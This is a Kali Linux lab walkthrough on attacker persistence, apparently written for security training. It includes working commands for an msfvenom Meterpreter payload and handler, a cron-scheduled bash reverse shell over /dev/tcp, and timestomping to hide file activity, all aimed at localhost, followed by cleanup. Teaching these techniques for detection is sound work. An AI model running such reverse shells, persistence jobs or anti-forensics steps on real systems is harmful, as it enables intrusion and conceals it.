# Persistence Tactics in Action

**Estimated time:** ~40 minutes
**Platform:** Kali Linux (local lab)

## Overview

This lab simulates how attackers maintain long-term access to compromised Linux systems using common persistence and anti-forensics techniques. You will establish a reverse shell, create cron-based persistence, perform timestomping, conceptually explore process migration, and then fully clean up the system.

The exercises are intentionally hands-on and defensive in spirit: understanding these techniques helps you detect, disrupt, and remediate them.

---

## Terminal Usage Guide

Keep three terminals open throughout the lab:

* **Terminal 1 – Victim Setup Terminal**
  Create and manage the non-privileged victim user, handle file operations, and perform cleanup.

* **Terminal 2 – Metasploit Terminal**
  Launch and control the Metasploit Framework, configure listeners, and manage sessions.

* **Terminal 3 – Cron Persistence Terminal**
  Configure, monitor, and test cron-based persistence.

---

## Learning Objectives

By the end of this lab, you will be able to:

* Create Linux persistence using cron jobs
* Establish and validate reverse shells
* Perform timestomping to obscure file activity
* Understand why process migration differs between Windows and Linux
* Fully remove persistence mechanisms and artifacts

---

## Exercise 1: Environment Setup

**(Terminal 1 – Victim Setup Terminal)**

### Step 1.1: Create a non-privileged victim user

```bash
sudo adduser victim --disabled-password --gecos ""
```

**Why:** Simulates a limited account already under attacker control.

### Step 1.2: Generate a reverse shell payload

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
sudo cp shell.elf /home/victim/
sudo chown victim:victim /home/victim/shell.elf
```

**Why:** Models delivery of a malicious binary to a compromised user.

---

## Exercise 2: Meterpreter Session

**(Terminal 2 – Metasploit Terminal)**

### Step 2.1: Launch Metasploit

```bash
msfconsole
```

### Step 2.2: Configure the listener

```text
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST 127.0.0.1
set LPORT 4444
run
```

### Step 2.3: Execute the payload

**(Terminal 1)**

```bash
sudo -u victim /home/victim/shell.elf &
```

### Step 2.4: Verify the session

```text
background
sessions
sessions 1
```

**Why:** Confirms interactive access to the compromised account.

---

## Exercise 3: Cron-Based Persistence

**(Terminal 3 – Cron Persistence Terminal)**

### Step 3.1: Add a cron reverse shell

```bash
echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/127.0.0.1/4445 0>&1'" | sudo crontab -u victim -
```

### Step 3.2: Verify cron job

```bash
sudo crontab -u victim -l
```

**Why:** Ensures access is re-established automatically.

---

## Exercise 4: Persistence Validation

### Step 4.1: Exit the active Meterpreter session

**(Terminal 2)**

```text
exit
```

### Step 4.2: Start a Netcat listener

**(Terminal 3)**

```bash
nc -lvnp 4445
```

### Step 4.3: Wait for reconnection

Wait up to five minutes for the cron job to trigger.

**Why:** Demonstrates unattended persistence.

---

## Exercise 5: Timestomping

**(Terminal 1 – Victim Setup Terminal)**

### Step 5.1: Create a file

```bash
sudo -u victim touch /home/victim/loot.txt
```

### Step 5.2: Backdate timestamps

```bash
sudo touch -t 200001011200 /home/victim/loot.txt
```

### Step 5.3: Verify timestamps

```bash
sudo ls -l --time=atime /home/victim/
sudo ls -l --time=mtime /home/victim/
```

**Why:** Demonstrates a basic anti-forensics technique.

---

## Exercise 6: Process Migration (Conceptual)

### Step 6.1: Re-execute payload

**(Terminal 1)**

```bash
sudo -u victim /home/victim/shell.elf &
```

**(Terminal 2)**

```text
run
```

### Step 6.2: List bash processes

**(Terminal 1)**

```bash
ps aux | grep bash
```

### Step 6.3: Attempt migration

**(Meterpreter)**

```text
migrate <PID>
```

**Why:** Highlights that Meterpreter migration is Windows-specific. On Linux, attackers rely on daemonization, injection, or persistence mechanisms instead.

---

## Exercise 7: Full Cleanup

**(Terminal 1 – Victim Setup Terminal)**

```bash
sudo crontab -u victim -r
sudo rm /home/victim/shell.elf
sudo rm /home/victim/loot.txt
sudo deluser --remove-home victim
```

**Why:** Restores the system to a clean state and removes all artifacts.

---

## Challenge Exercise: Manual Persistence (No Metasploit)

Create persistence using a Bash or Python one-liner (for example, a cron-based reverse shell without Meterpreter). This reinforces understanding of how little tooling is required for persistence.

---

## Summary

In this lab you:

* Delivered a malicious payload to a compromised user
* Established and validated reverse shell access
* Implemented cron-based persistence
* Performed timestomping to obscure evidence
* Explored process migration limitations on Linux
* Removed all persistence mechanisms and artifacts

Understanding these techniques is essential for detecting and defending against real-world intrusions.
